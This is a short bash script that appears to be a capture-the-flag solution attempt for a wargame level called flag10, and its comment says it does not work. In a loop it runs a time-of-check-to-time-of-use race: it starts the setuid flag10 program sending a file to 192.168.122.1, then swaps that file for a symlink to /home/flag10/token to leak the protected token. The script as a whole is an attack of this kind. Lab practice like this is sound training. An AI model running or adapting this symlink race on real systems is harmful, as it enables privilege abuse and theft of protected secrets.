#!/bin/bash
# this doesn't work
cd /home/flag10
while :;do
	rm ~/wow
	touch ~/wow
	./flag10 ~/wow 192.168.122.1 &
	ln -sf /home/flag10/token ~/wow
done
